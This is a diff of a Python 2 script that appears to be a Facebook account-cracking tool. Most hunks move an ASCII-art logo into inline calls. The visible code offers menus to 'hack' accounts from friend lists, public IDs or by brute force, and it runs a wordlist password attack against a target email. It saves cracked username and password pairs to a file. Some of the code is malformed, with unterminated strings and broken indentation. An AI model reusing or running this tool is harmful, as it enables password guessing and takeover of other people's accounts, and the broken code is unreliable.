@@ -51,16 +51,6 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.1)
 
-logo1="""
-jalan('\x1b[1;92m┏━┓┏━┓┃┃┃┃┃┃━━━┓┃┃┃┓┃┃┃┃┃┏┓┃')
-jalan('\x1b[1;92m┃┃┗┛┃┃┃┃┃┃┃┃┏━┓┃┃┃┃┃┃┃┃┃┃┛┗┓')
-jalan('\x1b[1;92m┃┏┓┏┓┃━┓┃┃┃┃┗━┛┃━━┓┗━┓━━┓┓┏┛')
-jalan('\x1b[1;92m┃┃┃┃┃┃┏┛━━━┓┏┓┏┛┏┓┃┏┓┃┏┓┃┃┃┃')
-jalan('\x1b[1;92m┃┃┃┃┃┃┃┃━━━┛┃┃┗┓┗┛┃┗┛┃┗┛┃┃┗┓')
-jalan('\x1b[1;92m┗┛┗┛┗┛┛┃┃┃┃┃┛┗━┛━━┛━━┛━━┛┗━┛')
-jalan('\x1b[1;97m┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃
-jalan('\x1b[1;97m┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃
-"""
 
 def tik():
     titik = [
@@ -117,7 +107,14 @@ idh = []
 def logmen():
     os.system('clear')
     print 
-    print logo1
+    jalan('\x1b[1;92m┏━┓┏━┓┃┃┃┃┃┃━━━┓┃┃┃┓┃┃┃┃┃┏┓┃')
+    jalan('\x1b[1;92m┃┃┗┛┃┃┃┃┃┃┃┃┏━┓┃┃┃┃┃┃┃┃┃┃┛┗┓')
+    jalan('\x1b[1;92m┃┏┓┏┓┃━┓┃┃┃┃┗━┛┃━━┓┗━┓━━┓┓┏┛')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┏┛━━━┓┏┓┏┛┏┓┃┏┓┃┏┓┃┃┃┃')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┃┃━━━┛┃┃┗┓┗┛┃┗┛┃┗┛┃┃┗┓')
+    jalan('\x1b[1;92m┗┛┗┛┗┛┛┃┃┃┃┃┛┗━┛━━┛━━┛━━┛┗━┛')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃')
     print ' [1] Login Token'
     print ' [\x1b[91m0\x1b[0m] Exit Tool'
     pilog()
@@ -126,7 +123,14 @@ def pilog():
     if og =="1":
         os.system("clear")
         print
-        print logo1
+        jalan('\x1b[1;92m┏━┓┏━┓┃┃┃┃┃┃━━━┓┃┃┃┓┃┃┃┃┃┏┓┃')
+        jalan('\x1b[1;92m┃┃┗┛┃┃┃┃┃┃┃┃┏━┓┃┃┃┃┃┃┃┃┃┃┛┗┓')
+        jalan('\x1b[1;92m┃┏┓┏┓┃━┓┃┃┃┃┗━┛┃━━┓┗━┓━━┓┓┏┛')
+        jalan('\x1b[1;92m┃┃┃┃┃┃┏┛━━━┓┏┓┏┛┏┓┃┏┓┃┏┓┃┃┃┃')
+        jalan('\x1b[1;92m┃┃┃┃┃┃┃┃━━━┛┃┃┗┓┗┛┃┗┛┃┗┛┃┃┗┓')
+        jalan('\x1b[1;92m┗┛┗┛┗┛┛┃┃┃┃┃┛┗━┛━━┛━━┛━━┛┗━┛')
+        jalan('\x1b[1;92m┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃')
+        jalan('\x1b[1;92m┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃')
         token = raw_input("[+] Past Your Token Here : ")
         sav = open(".logfuck.txt","w")
         sav.write(token)
@@ -181,7 +185,14 @@ def menu():
 
     os.system('clear')
     print
-    print logo1
+    jalan('\x1b[1;92m┏━┓┏━┓┃┃┃┃┃┃━━━┓┃┃┃┓┃┃┃┃┃┏┓┃')
+    jalan('\x1b[1;92m┃┃┗┛┃┃┃┃┃┃┃┃┏━┓┃┃┃┃┃┃┃┃┃┃┛┗┓')
+    jalan('\x1b[1;92m┃┏┓┏┓┃━┓┃┃┃┃┗━┛┃━━┓┗━┓━━┓┓┏┛')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┏┛━━━┓┏┓┏┛┏┓┃┏┓┃┏┓┃┃┃┃')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┃┃━━━┛┃┃┗┓┗┛┃┗┛┃┗┛┃┃┗┓')
+    jalan('\x1b[1;92m┗┛┗┛┗┛┛┃┃┃┃┃┛┗━┛━━┛━━┛━━┛┗━┛')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃')
     print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;32;40m[*] Name\x1b[1;32;40m: ' + nama + '  \t   \x1b[1;36;40m\xe2\x95\x91'
     print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;33;40m[*] ID  \x1b[1;34;40m: ' + id + '        \x1b[1;36;40m\xe2\x95\x91'
     print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;36;40m[*] Subs\x1b[1;34;40m: ' + sub + '                      \x1b[1;36;40m\xe2\x95\x91'
@@ -200,7 +211,7 @@ def pilih():
         super()
     elif unikers == '2':
         os.system('clear')
-        print logo1
+        print
         print "\033[1;95m«-----------------\033[1;91mDataReset\033[1;95m---------------»"
                 jalan('\033[1;96m=10%')
                 jalan("\033[1;96m==20%")
@@ -237,7 +248,15 @@ def super():
         logmen()
 
     os.system('clear')
-    print logo1
+    print
+    jalan('\x1b[1;92m┏━┓┏━┓┃┃┃┃┃┃━━━┓┃┃┃┓┃┃┃┃┃┏┓┃')
+    jalan('\x1b[1;92m┃┃┗┛┃┃┃┃┃┃┃┃┏━┓┃┃┃┃┃┃┃┃┃┃┛┗┓')
+    jalan('\x1b[1;92m┃┏┓┏┓┃━┓┃┃┃┃┗━┛┃━━┓┗━┓━━┓┓┏┛')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┏┛━━━┓┏┓┏┛┏┓┃┏┓┃┏┓┃┃┃┃')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┃┃━━━┛┃┃┗┓┗┛┃┗┛┃┗┛┃┃┗┓')
+    jalan('\x1b[1;92m┗┛┗┛┗┛┛┃┃┃┃┃┛┗━┛━━┛━━┛━━┛┗━┛')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃')
+    jalan('\x1b[1;92m┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃┃')
     print '\x1b[1;32;40m[type1] \x1b[1;33;41mHack From Friend List'
     print '\x1b[1;32;40m[type2] \x1b[1;33;42mHack From Public ID'
     print '\x1b[1;32;40m[type3] \x1b[1;33;43mHack Bruteforce'
@@ -312,7 +331,7 @@ def pilih_super():
             sys.stdout.flush()
             time.sleep(1)
 
-    print logo1
+    print
     print '\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z'
     print 42 * '\x1b[1;96m='
 
@@ -446,8 +465,6 @@ def brute():
             passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
             total = total.readlines()
-            print '32LvtVzwuSqOOfQNHAO8Kbcu+eucnC0Se6F0D8enV+be539qb5AqugrT2Xv13pJoqAnL49kwQ9C7mpJiiuL/5EXcbO6i5QWAuoNZio5Z2puD7MkTTyKKBeCbZvfNfN1oe2kTbOsMAZjj1AG8dQ6bSgaEhlPlLN2CGVEhBinG1x5GMtyx+NMIoUBuG4knKx5W/pqbCg7HmMS8Rg1b6nxtRtu6Rol587wXpgAAlKYVn57bX0FjiXRDU8oVcW0mSA1hnQRjeoRoKi+PDELZXpyI+Xm56DpSScaZBc1fPYkWjzyAaf1H1GXL1qFZQk2YbsH3OV3wLhwgeTHTkWpvKao3psevVO1I3LDLckNlyjthCumUeq9agoo1VmdJLe/vn6G+27uUhgIC478nYHE5i9Bbu9Hc7YyPw4uzLUHv7cEbxqhIAOeAnu33RRxmcsGwgFg2jaDLnkSQh3zbznlwsef/luw6R30fqPakCs8bX9JUgYnqlul3h+AYpDUaWnuOXt0Kz50mHIi8EhJpcnRdmin8jG+LVRCbT289OiW59KuxQFcnCMsLEngYXpeKZSNIWAhPWTKaBlGUW0YgsjeWspaCAelsZifUe+ryAN7IzsGqkOjLG92DkMC30MjRiQkbj3Wvo/S575amjhzOmSaZYHTk1VKTv/42KWxyu3+UfJj2BO5Qkeql/ndATzavbDnopb/kAIekfMXgCQGqvL3Kb/gCq1fleJA+hlSKzs+anXJsMeRCiXuTtTdyTrecAgFHAmZbs/AP0bNWk8gnCfFFz9X8D4VawTc0grPXD/FaKWdgB3g0nXkLQGfZdn4qMsaJJI8nsGyivCa6zOloMby/Dx2RRZckSyyWfAy4djUOKPEmozWch84lVyhzyiIVxqyDmiFAQ0gU4pcIZQM='
-            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
             print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
             jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
             sandi = open(passw, 'r')
@@ -471,7 +488,7 @@ def brute():
                         ceks = open('Brutecekpoint.txt', 'w')
                         ceks.write(email + ' | ' + pw + '\n')
                         ceks.close()
-                        print logo1
+                        print
                         print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                         print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
